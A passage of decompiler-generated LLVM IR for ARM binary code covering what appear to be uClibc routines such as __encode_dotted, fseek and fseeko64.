  %v0_14884 = phi i32 [ %v1_14884, %dec_label_pc_1487c ], [ %arg2, %entry ]
  %v0_14888 = phi i32 [ %v1_14888, %dec_label_pc_1487c ], [ %tmp, %entry ]
  %v9_14850 = icmp eq i32 %v0_14888, %v0_14884
  %.pre = inttoptr i32 %v0_14888 to i8*
  br i1 %v9_14850, label %dec_label_pc_1487c, label %dec_label_pc_14858

dec_label_pc_14858:                               ; preds = %dec_label_pc_14850
  %v2_14858 = load i8, i8* %.pre, align 1
  %v3_14858 = zext i8 %v2_14858 to i32
  %v1_1485c = inttoptr i32 %v0_14884 to i8*
  %v2_1485c = load i8, i8* %v1_1485c, align 1
  %v3_1485c = zext i8 %v2_1485c to i32
  %v4_14860 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 736) to i32*), align 4
  %v2_14864 = mul nuw nsw i32 %v3_1485c, 2
  %v2_14868 = mul nuw nsw i32 %v3_14858, 2
  %v2_1486c = add i32 %v4_14860, %v2_14864
  %v3_1486c = inttoptr i32 %v2_1486c to i16*
  %v4_1486c = load i16, i16* %v3_1486c, align 2
  %v6_1486c = sext i16 %v4_1486c to i32
  %v2_14870 = add i32 %v4_14860, %v2_14868
  %v3_14870 = inttoptr i32 %v2_14870 to i16*
  %v4_14870 = load i16, i16* %v3_14870, align 2
  %v6_14870 = sext i16 %v4_14870 to i32
  %v2_14874 = sub nsw i32 %v6_14870, %v6_1486c
  %v9_14874 = icmp eq i16 %v4_14870, %v4_1486c
  br i1 %v9_14874, label %dec_label_pc_1487c, label %dec_label_pc_14890

dec_label_pc_1487c:                               ; preds = %dec_label_pc_14850, %dec_label_pc_14858
  %v1_148949 = phi i32 [ %v2_14874, %dec_label_pc_14858 ], [ %v1_148948, %dec_label_pc_14850 ]
  %v2_1487c = load i8, i8* %.pre, align 1
  %v2_14880 = icmp eq i8 %v2_1487c, 0
  %v1_14884 = add i32 %v0_14884, 1
  %v1_14888 = add i32 %v0_14888, 1
  store i32 %v1_14888, i32* @ip, align 4
  br i1 %v2_14880, label %dec_label_pc_14890, label %dec_label_pc_14850

dec_label_pc_14890:                               ; preds = %dec_label_pc_1487c, %dec_label_pc_14858
  %v1_14894 = phi i32 [ %v1_148949, %dec_label_pc_1487c ], [ %v2_14874, %dec_label_pc_14858 ]
  ret i32 %v1_14894

; uselistorder directives
  uselistorder i32 %v1_14888, { 1, 0 }
  uselistorder i32 %v2_14874, { 1, 0 }
  uselistorder i32 %v0_14888, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1487c, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_148a0 = load i32, i32* @r4, align 4
  store i32 %v3_148a0, i32* %stack_var_-32, align 4
  %v6_148a0 = load i32, i32* @r5, align 4
  %v9_148a0 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_148a8 = load i32, i32* @r1, align 4
  store i32 %v0_148a8, i32* %r8.global-to-local, align 4
  %v0_148ac = load i32, i32* @r2, align 4
  store i32 %v0_148ac, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1491423 = icmp slt i8* %arg1, null
  store i1 %v1_1491423, i1* %cpsr_n.global-to-local, align 1
  %v2_1491424 = icmp eq i8* %arg1, null
  store i1 %v2_1491424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1491424, label %dec_label_pc_1492c, label %dec_label_pc_14920

dec_label_pc_148b8:                               ; preds = %dec_label_pc_14920
  %v2_148b8 = call i32 @__GI_strchr(i32 %v0_148b826, i32 46)
  store i32 %v2_148b8, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_148bc = icmp slt i32 %v2_148b8, 0
  store i1 %v1_148bc, i1* %cpsr_n.global-to-local, align 1
  %v2_148bc = icmp eq i32 %v2_148b8, 0
  store i1 %v2_148bc, i1* %cpsr_z.global-to-local, align 1
  %v0_148c0 = load i32, i32* @r4, align 4
  %v2_148c0 = sub i32 %v2_148b8, %v0_148c0
  store i32 %v2_148c0, i32* @r5, align 4
  br i1 %v2_148bc, label %dec_label_pc_148c8, label %dec_label_pc_148d4

dec_label_pc_148c8:                               ; preds = %dec_label_pc_148b8
  %v1_148c8 = inttoptr i32 %v0_148c0 to i8*
  %v3_148cc = call i32 @strlen(i8* %v1_148c8)
  %sext = mul i32 %v3_148cc, 16777216
  %v1_148d0 = sdiv i32 %sext, 16777216
  store i32 %v1_148d0, i32* @r5, align 4
  %v0_148e0.pre = load i32, i32* @r4, align 4
  %v0_148f0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_148d4

dec_label_pc_148d4:                               ; preds = %dec_label_pc_148b8, %dec_label_pc_148c8
  %v0_148f0 = phi i32 [ %v2_148b8, %dec_label_pc_148b8 ], [ %v0_148f0.pre, %dec_label_pc_148c8 ]
  %v0_148e0 = phi i32 [ %v0_148c0, %dec_label_pc_148b8 ], [ %v0_148e0.pre, %dec_label_pc_148c8 ]
  %v0_14900 = phi i32 [ %v2_148c0, %dec_label_pc_148b8 ], [ %v1_148d0, %dec_label_pc_148c8 ]
  %v0_148d4 = load i32, i32* %sl.global-to-local, align 4
  %v1_148d4 = add i32 %v0_148d4, 1
  store i32 %v1_148d4, i32* %r7.global-to-local, align 4
  %v1_148d8 = load i32, i32* %sb.global-to-local, align 4
  %v2_148d8 = sub i32 %v1_148d8, %v0_148d4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_148dc = icmp slt i32 %v0_14900, 0
  store i1 %v1_148dc, i1* %cpsr_n.global-to-local, align 1
  %v2_148dc = icmp eq i32 %v0_14900, 0
  store i1 %v2_148dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_148e0, i32* @r1, align 4
  %v0_148e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_148e4 = add i32 %v0_148e4, %v1_148d4
  store i32 %v2_148e4, i32* @r0, align 4
  store i32 %v0_14900, i32* @r2, align 4
  %v1_148ec = add i32 %v2_148d8, -1
  store i32 %v1_148ec, i32* @r3, align 4
  %v1_148f0 = add i32 %v0_148f0, 1
  store i32 %v1_148f0, i32* @r4, align 4
  br i1 %v2_148dc, label %dec_label_pc_14940, label %dec_label_pc_148f8

dec_label_pc_148f8:                               ; preds = %dec_label_pc_148d4
  %v2_148f8 = sub i32 %v0_14900, %v1_148ec
  %v3_148f8 = icmp ult i32 %v0_14900, %v1_148ec
  %v4_148f8 = xor i32 %v1_148ec, %v0_14900
  %v5_148f8 = xor i32 %v2_148f8, %v0_14900
  %v6_148f8 = and i32 %v5_148f8, %v4_148f8
  %v7_148f8 = icmp slt i32 %v6_148f8, 0
  store i1 %v7_148f8, i1* %cpsr_v.global-to-local, align 1
  %v8_148f8 = icmp slt i32 %v2_148f8, 0
  store i1 %v8_148f8, i1* %cpsr_n.global-to-local, align 1
  %v9_148f8 = icmp eq i32 %v0_14900, %v1_148ec
  store i1 %v9_148f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_148f8, label %dec_label_pc_14900, label %dec_label_pc_14940

dec_label_pc_14900:                               ; preds = %dec_label_pc_148f8
  %v1_14900 = trunc i32 %v0_14900 to i8
  %v4_14900 = add i32 %v0_148e4, %v0_148d4
  %v5_14900 = inttoptr i32 %v4_14900 to i8*
  store i8 %v1_14900, i8* %v5_14900, align 1
  %v0_14904 = call i32 @memcpy()
  store i32 %v0_14904, i32* @r0, align 4
  %v0_14908 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14908 = icmp slt i32 %v0_14908, 0
  store i1 %v1_14908, i1* %cpsr_n.global-to-local, align 1
  %v2_14908 = icmp eq i32 %v0_14908, 0
  store i1 %v2_14908, i1* %cpsr_z.global-to-local, align 1
  %v0_1490c = load i32, i32* @r5, align 4
  %v1_1490c = load i32, i32* %r7.global-to-local, align 4
  %v2_1490c = add i32 %v1_1490c, %v0_1490c
  store i32 %v2_1490c, i32* %sl.global-to-local, align 4
  br i1 %v2_14908, label %dec_label_pc_1492c, label %dec_label_pc_14900.dec_label_pc_14914_crit_edge

dec_label_pc_14900.dec_label_pc_14914_crit_edge:  ; preds = %dec_label_pc_14900
  %v0_14914.pre = load i32, i32* @r4, align 4
  store i32 %v0_14914.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14914 = icmp slt i32 %v0_14914.pre, 0
  store i1 %v1_14914, i1* %cpsr_n.global-to-local, align 1
  %v2_14914 = icmp eq i32 %v0_14914.pre, 0
  store i1 %v2_14914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14914, label %dec_label_pc_1492c, label %dec_label_pc_14920

dec_label_pc_14920:                               ; preds = %entry, %dec_label_pc_14900.dec_label_pc_14914_crit_edge
  %v0_148b826 = phi i32 [ %v0_14914.pre, %dec_label_pc_14900.dec_label_pc_14914_crit_edge ], [ %tmp, %entry ]
  %v5_14934525 = phi i32 [ %v2_1490c, %dec_label_pc_14900.dec_label_pc_14914_crit_edge ], [ 0, %entry ]
  %v1_14920 = inttoptr i32 %v0_148b826 to i8*
  %v2_14920 = load i8, i8* %v1_14920, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14924 = icmp eq i8 %v2_14920, 0
  store i1 %v2_14924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14924, label %dec_label_pc_1492c, label %dec_label_pc_148b8

dec_label_pc_1492c:                               ; preds = %dec_label_pc_14900.dec_label_pc_14914_crit_edge, %dec_label_pc_14900, %dec_label_pc_14920, %entry
  %v8_14938 = phi i32 [ 0, %entry ], [ %v5_14934525, %dec_label_pc_14920 ], [ %v2_1490c, %dec_label_pc_14900 ], [ %v2_1490c, %dec_label_pc_14900.dec_label_pc_14914_crit_edge ]
  %v0_1492c = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1492c = icmp slt i32 %v0_1492c, 0
  store i1 %v1_1492c, i1* %cpsr_n.global-to-local, align 1
  %v2_1492c = icmp eq i32 %v0_1492c, 0
  store i1 %v2_1492c, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_1492c, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_1492c
  %v6_14934 = add i32 %v8_14938, 1
  store i32 %v6_14934, i32* @r0, align 4
  %v7_14938 = load i32, i32* %r8.global-to-local, align 4
  %v9_14938 = add i32 %v7_14938, %v8_14938
  %v10_14938 = inttoptr i32 %v9_14938 to i8*
  store i8 0, i8* %v10_14938, align 1
  %v0_1493c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1493c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1493c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_1492c, %bb
  %v2_1493c = phi i1 [ %v2_1493c.pre, %bb ], [ false, %dec_label_pc_1492c ]
  %v1_1493c = phi i1 [ %v1_1493c.pre, %bb ], [ %v1_1492c, %dec_label_pc_1492c ]
  %v0_1493c = phi i1 [ %v0_1493c.pre, %bb ], [ %v2_1492c, %dec_label_pc_1492c ]
  %v3_1493c = xor i1 %v2_1493c, %v1_1493c
  %v4_1493c = or i1 %v0_1493c, %v3_1493c
  br i1 %v4_1493c, label %dec_label_pc_14940, label %.dec_label_pc_14944_crit_edge

.dec_label_pc_14944_crit_edge:                    ; preds = %bb22
  %v1_14948.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14944

dec_label_pc_14940:                               ; preds = %dec_label_pc_148f8, %dec_label_pc_148d4, %bb22
  br label %dec_label_pc_14944

dec_label_pc_14944:                               ; preds = %.dec_label_pc_14944_crit_edge, %dec_label_pc_14940
  %v1_14948 = phi i32 [ %v1_14948.pre, %.dec_label_pc_14944_crit_edge ], [ -1, %dec_label_pc_14940 ]
  %v2_14944 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_14944, i32* @r4, align 4
  store i32 %v6_148a0, i32* @r5, align 4
  store i32 %v9_148a0, i32* @r6, align 4
  ret i32 %v1_14948

; uselistorder directives
  uselistorder i32 %v0_1492c, { 0, 2, 1 }
  uselistorder i32 %v0_14914.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14908, { 1, 0 }
  uselistorder i32 %v2_148f8, { 1, 0 }
  uselistorder i32 %v1_148ec, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_14900, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_148d0, { 1, 0 }
  uselistorder i1 %v2_1491424, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i8 0, { 6, 39, 40, 41, 25, 26, 43, 44, 42, 0, 1, 45, 38, 47, 48, 49, 50, 46, 52, 51, 8, 53, 54, 55, 28, 56, 57, 2, 59, 58, 60, 3, 61, 27, 62, 9, 10, 63, 4, 64, 65, 67, 66, 29, 68, 30, 11, 69, 70, 71, 72, 12, 74, 73, 13, 14, 15, 16, 17, 76, 75, 31, 77, 5, 78, 79, 7, 80, 82, 81, 32, 83, 18, 84, 85, 19, 20, 21, 22, 23, 86, 33, 24, 88, 34, 89, 90, 87, 91, 92, 93, 94, 95, 96, 97, 98, 100, 99, 101, 103, 104, 102, 35, 105, 106, 37, 107, 36, 108, 109 }
  uselistorder i32 ()* @memcpy, { 15, 21, 20, 19, 18, 17, 14, 13, 8, 7, 6, 5, 4, 3, 10, 16, 12, 11, 2, 9, 0, 1 }
  uselistorder i32 (i8*)* @strlen, { 7, 5, 18, 17, 16, 19, 4, 3, 2, 1, 15, 14, 6, 13, 12, 11, 9, 10, 8, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 10, 6, 5, 4, 2, 1, 0, 9, 8, 7, 13, 12, 11, 3 }
  uselistorder label %dec_label_pc_14944, { 1, 0 }
  uselistorder label %dec_label_pc_14940, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_1492c, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_14920, { 1, 0 }
  uselistorder label %dec_label_pc_148d4, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_14958 = load i32, i32* @r1, align 4
  store i32 %v0_14958, i32* @r2, align 4
  %v0_14960 = call i32 @__GI_fseeko64()
  ret i32 %v0_14960
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v3_14970 = load i32, i32* @r4, align 4
  %v6_14970 = load i32, i32* @r5, align 4
  %v12_14970 = load i32, i32* @r7, align 4
  store i32 %tmp16, i32* @r7, align 4
  %v0_14984 = load i32, i32* @r2, align 4
  store i32 %v0_14984, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r6.global-to-local, align 4
  %v0_14990 = load i32, i32* @r0, align 4
  store i32 %v0_14990, i32* @r5, align 4
  %tmp = icmp ult i32 %tmp16, 3
  br i1 %tmp, label %dec_label_pc_149ac, label %dec_label_pc_14998

dec_label_pc_14998:                               ; preds = %entry
  %v0_14998 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_149a4 = inttoptr i32 %v0_14998 to i32*
  store i32 22, i32* %v2_149a4, align 4
  br label %dec_label_pc_14a9c

dec_label_pc_149ac:                               ; preds = %entry
  %v1_149ac = add i32 %v0_14990, 52
  %v2_149ac = inttoptr i32 %v1_149ac to i32*
  %v3_149ac = load i32, i32* %v2_149ac, align 4
  %v1_149b0 = sub i32 1, %v3_149ac
  store i32 %v1_149b0, i32* %r8.global-to-local, align 4
  %v2_149b0 = icmp ult i32 %v3_149ac, 2
  br i1 %v2_149b0, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_149ac
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_149f8

bb:                                               ; preds = %dec_label_pc_149ac
  %v2_149b8 = icmp eq i32 %v1_149b0, 0
  br i1 %v2_149b8, label %dec_label_pc_149f8, label %dec_label_pc_149c0

dec_label_pc_149c0:                               ; preds = %bb
  %v1_149c4 = add i32 %v0_14990, 56
  store i32 %v1_149c4, i32* @r4, align 4
  %v4_149c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 36) to i32*), align 4
  store i32 %v4_149c8, i32* %r1.global-to-local, align 4
  store i32 %v1_149c4, i32* %r2.global-to-local, align 4
  %v4_149d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_149d8)
  %v0_149ec = load i32, i32* %r6.global-to-local, align 4
  %v2_149ec = add i32 %v0_149ec, 16
  %v3_149ec = inttoptr i32 %v2_149ec to i32*
  %v4_149ec = load i32, i32* %v3_149ec, align 4
  store i32 %v4_149ec, i32* @ip, align 4
  store i32 84472, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_149ec)
  %v0_149f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_149f8

dec_label_pc_149f8:                               ; preds = %.thread, %bb, %dec_label_pc_149c0
  %v0_14a04 = phi i32 [ %v0_14990, %.thread ], [ %v0_14990, %bb ], [ %v0_149f8.pre, %dec_label_pc_149c0 ]
  %v1_149f8 = inttoptr i32 %v0_14a04 to i16*
  %v2_149f8 = load i16, i16* %v1_149f8, align 2
  %v1_149fc = and i16 %v2_149f8, 64
  %v2_149fc = icmp eq i16 %v1_149fc, 0
  br i1 %v2_149fc, label %dec_label_pc_14a14, label %dec_label_pc_14a04

dec_label_pc_14a04:                               ; preds = %dec_label_pc_149f8
  store i32 %v0_14a04, i32* @r0, align 4
  %v0_14a08 = call i32 @__stdio_wcommit()
  %v2_14a0c = icmp eq i32 %v0_14a08, 0
  br i1 %v2_14a0c, label %dec_label_pc_14a14, label %dec_label_pc_14a7c

dec_label_pc_14a14:                               ; preds = %dec_label_pc_14a04, %dec_label_pc_149f8
  %v0_14a14 = load i32, i32* @r7, align 4
  %v7_14a14 = icmp eq i32 %v0_14a14, 1
  br i1 %v7_14a14, label %dec_label_pc_14a1c, label %dec_label_pc_14a14.dec_label_pc_14a30_crit_edge

dec_label_pc_14a14.dec_label_pc_14a30_crit_edge:  ; preds = %dec_label_pc_14a14
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_14a30

dec_label_pc_14a1c:                               ; preds = %dec_label_pc_14a14
  %v0_14a1c = load i32, i32* @r5, align 4
  %v2_14a20 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_14a20, i32* %r1.global-to-local, align 4
  %v2_14a24 = inttoptr i32 %v0_14a1c to i16*
  %v3_14a24 = call i32 @__stdio_adjust_position(i16* %v2_14a24, i32 %v2_14a20)
  %v1_14a28 = icmp slt i32 %v3_14a24, 0
  br i1 %v1_14a28, label %dec_label_pc_14a7c, label %dec_label_pc_14a1c.dec_label_pc_14a30_crit_edge

dec_label_pc_14a1c.dec_label_pc_14a30_crit_edge:  ; preds = %dec_label_pc_14a1c
  %v0_14a30.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14a30

dec_label_pc_14a30:                               ; preds = %dec_label_pc_14a14.dec_label_pc_14a30_crit_edge, %dec_label_pc_14a1c.dec_label_pc_14a30_crit_edge
  %v2_14a38.pre-phi = phi i32 [ %.pre, %dec_label_pc_14a14.dec_label_pc_14a30_crit_edge ], [ %v2_14a20, %dec_label_pc_14a1c.dec_label_pc_14a30_crit_edge ]
  %v0_14a30 = phi i32 [ %v0_14a14, %dec_label_pc_14a14.dec_label_pc_14a30_crit_edge ], [ %v0_14a30.pre, %dec_label_pc_14a1c.dec_label_pc_14a30_crit_edge ]
  store i32 %v0_14a30, i32* %r2.global-to-local, align 4
  %v0_14a34 = load i32, i32* @r5, align 4
  store i32 %v2_14a38.pre-phi, i32* %r1.global-to-local, align 4
  %v4_14a3c = call i32 @__stdio_seek(i32 %v0_14a34, i32* nonnull %stack_var_-32, i32 %v0_14a30)
  %v1_14a40 = icmp slt i32 %v4_14a3c, 0
  br i1 %v1_14a40, label %dec_label_pc_14a7c, label %dec_label_pc_14a48

dec_label_pc_14a48:                               ; preds = %dec_label_pc_14a30
  %v0_14a48 = load i32, i32* @r5, align 4
  %v1_14a48 = inttoptr i32 %v0_14a48 to i16*
  %v2_14a48 = load i16, i16* %v1_14a48, align 2
  %v1_14a4c = add i32 %v0_14a48, 8
  %v2_14a4c = inttoptr i32 %v1_14a4c to i32*
  %v3_14a4c = load i32, i32* %v2_14a4c, align 4
  store i32 %v3_14a4c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_14a54 = and i16 %v2_14a48, -72
  store i32 0, i32* %r4.global-to-local, align 4
  store i16 %v1_14a54, i16* %v1_14a48, align 2
  %v0_14a60 = load i32, i32* %r2.global-to-local, align 4
  %v1_14a60 = load i32, i32* @r5, align 4
  %v2_14a60 = add i32 %v1_14a60, 28
  %v3_14a60 = inttoptr i32 %v2_14a60 to i32*
  store i32 %v0_14a60, i32* %v3_14a60, align 4
  %v0_14a64 = load i32, i32* %r1.global-to-local, align 4
  %v1_14a64 = trunc i32 %v0_14a64 to i8
  %v2_14a64 = load i32, i32* @r5, align 4
  %v3_14a64 = add i32 %v2_14a64, 2
  %v4_14a64 = inttoptr i32 %v3_14a64 to i8*
  store i8 %v1_14a64, i8* %v4_14a64, align 1
  %v0_14a68 = load i32, i32* %r2.global-to-local, align 4
  %v1_14a68 = load i32, i32* @r5, align 4
  %v2_14a68 = add i32 %v1_14a68, 16
  %v3_14a68 = inttoptr i32 %v2_14a68 to i32*
  store i32 %v0_14a68, i32* %v3_14a68, align 4
  %v0_14a6c = load i32, i32* %r2.global-to-local, align 4
  %v1_14a6c = load i32, i32* @r5, align 4
  %v2_14a6c = add i32 %v1_14a6c, 20
  %v3_14a6c = inttoptr i32 %v2_14a6c to i32*
  store i32 %v0_14a6c, i32* %v3_14a6c, align 4
  %v0_14a70 = load i32, i32* %r2.global-to-local, align 4
  %v1_14a70 = load i32, i32* @r5, align 4
  %v2_14a70 = add i32 %v1_14a70, 24
  %v3_14a70 = inttoptr i32 %v2_14a70 to i32*
  store i32 %v0_14a70, i32* %v3_14a70, align 4
  %v0_14a74 = load i32, i32* %r1.global-to-local, align 4
  %v1_14a74 = load i32, i32* @r5, align 4
  %v2_14a74 = add i32 %v1_14a74, 44
  %v3_14a74 = inttoptr i32 %v2_14a74 to i32*
  store i32 %v0_14a74, i32* %v3_14a74, align 4
  br label %dec_label_pc_14a80

dec_label_pc_14a7c:                               ; preds = %dec_label_pc_14a04, %dec_label_pc_14a30, %dec_label_pc_14a1c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14a80

dec_label_pc_14a80:                               ; preds = %dec_label_pc_14a48, %dec_label_pc_14a7c
  %v0_14a80 = load i32, i32* %r8.global-to-local, align 4
  %v2_14a80 = icmp eq i32 %v0_14a80, 0
  br i1 %v2_14a80, label %dec_label_pc_14a80..thread8_crit_edge, label %bb20

dec_label_pc_14a80..thread8_crit_edge:            ; preds = %dec_label_pc_14a80
  %v0_14a98.pre = load i32, i32* @ip, align 4
  br label %.thread8

bb20:                                             ; preds = %dec_label_pc_14a80
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_14a90 = load i32, i32* %r6.global-to-local, align 4
  %v3_14a90 = add i32 %v1_14a90, 24
  %v4_14a90 = inttoptr i32 %v3_14a90 to i32*
  %v5_14a90 = load i32, i32* %v4_14a90, align 4
  store i32 %v5_14a90, i32* @ip, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14a80..thread8_crit_edge, %bb20
  %v0_14a98 = phi i32 [ %v0_14a98.pre, %dec_label_pc_14a80..thread8_crit_edge ], [ %v5_14a90, %bb20 ]
  %v2_14a98 = xor i1 %v2_14a80, true
  call void @__pseudo_cond_branch(i1 %v2_14a98, i32 %v0_14a98)
  br label %dec_label_pc_14a9c

dec_label_pc_14a9c:                               ; preds = %dec_label_pc_14998, %.thread8
  %v0_14a9c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_14970, i32* @r4, align 4
  store i32 %v6_14970, i32* @r5, align 4
  store i32 %v12_14970, i32* @r7, align 4
  ret i32 %v0_14a9c

; uselistorder directives
  uselistorder i32 %v0_14a30, { 1, 0 }
  uselistorder i32 %v3_149ac, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 3, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32 24, { 0, 30, 31, 48, 52, 54, 55, 32, 33, 34, 35, 36, 37, 38, 39, 1, 66, 6, 8, 56, 57, 40, 41, 42, 43, 9, 58, 59, 10, 53, 67, 2, 63, 60, 61, 62, 11, 12, 13, 15, 14, 16, 3, 17, 49, 50, 44, 64, 18, 65, 19, 20, 51, 21, 45, 46, 22, 47, 23, 24, 25, 4, 26, 27, 28, 7, 29, 5 }
  uselistorder i32 28, { 18, 19, 32, 4, 20, 21, 22, 23, 24, 25, 26, 0, 27, 6, 35, 5, 38, 39, 44, 46, 47, 7, 8, 45, 9, 10, 40, 33, 34, 28, 11, 29, 12, 49, 36, 37, 31, 48, 13, 1, 41, 42, 30, 43, 14, 15, 16, 3, 17, 2 }
  uselistorder i32 ()* @__stdio_wcommit, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 76, { 18, 19, 20, 21, 0, 4, 5, 6, 7, 8, 1, 9, 2, 10, 11, 12, 13, 14, 15, 16, 3, 17 }
  uselistorder i32 36, { 25, 26, 21, 22, 29, 30, 31, 32, 7, 4, 6, 27, 8, 23, 9, 24, 10, 0, 1, 11, 2, 5, 28, 12, 13, 14, 15, 16, 18, 19, 17, 20, 3 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 36) to i32*), { 0, 2, 4, 1, 3 }
  uselistorder i32 56, { 5, 4, 12, 6, 7, 8, 9, 13, 14, 11, 10, 2, 15, 1, 0, 3 }
  uselistorder i32 22, { 1, 11, 2, 3, 13, 4, 15, 0, 14, 5, 6, 7, 8, 12, 9, 10 }
  uselistorder i32 ptrtoint (i32* @global_var_1f010.69 to i32), { 95, 3, 8, 10, 5, 6, 9, 4, 7, 96, 97, 69, 11, 98, 12, 99, 71, 70, 33, 30, 31, 32, 29, 13, 36, 28, 72, 73, 100, 14, 15, 74, 101, 1, 102, 103, 104, 105, 106, 107, 75, 76, 108, 38, 37, 39, 109, 110, 27, 77, 111, 112, 113, 114, 78, 79, 115, 80, 116, 16, 117, 118, 119, 40, 17, 81, 120, 121, 122, 18, 82, 123, 124, 19, 20, 125, 21, 83, 126, 22, 127, 23, 128, 84, 129, 85, 130, 24, 25, 26, 131, 87, 132, 133, 134, 135, 136, 137, 34, 64, 60, 58, 57, 59, 61, 62, 63, 56, 65, 51, 53, 52, 50, 49, 54, 55, 46, 45, 48, 47, 44, 43, 42, 41, 89, 66, 88, 67, 35, 68, 86, 90, 138, 2, 92, 91, 93, 94, 139, 0 }
  uselistorder i32* @r7, { 19, 4, 20, 21, 22, 23, 0, 24, 25, 26, 27, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 106, 107, 28, 29, 30, 31, 32, 33, 34, 35, 36, 41, 42, 14, 15, 37, 38, 39, 40, 43, 44, 45, 46, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 132, 133, 134, 135, 136, 137, 138, 139, 146, 147, 148, 149, 150, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 47, 48, 49, 50, 1, 51, 2, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 5, 151, 152, 52, 53, 54, 55, 56, 57, 58, 59, 74, 140, 141, 142, 143, 144, 145, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 6, 153, 159, 154, 7, 155, 156, 157, 12, 158, 160, 8, 161, 162, 129, 130, 131, 99, 9, 100, 101, 102, 103, 104, 105, 60, 61, 66, 67, 68, 69, 62, 63, 64, 65, 70, 71, 72, 73, 240, 241, 242, 243, 204, 205, 75, 81, 82, 244, 245, 246, 249, 250, 10, 16, 17, 76, 77, 3, 78, 13, 79, 80, 206, 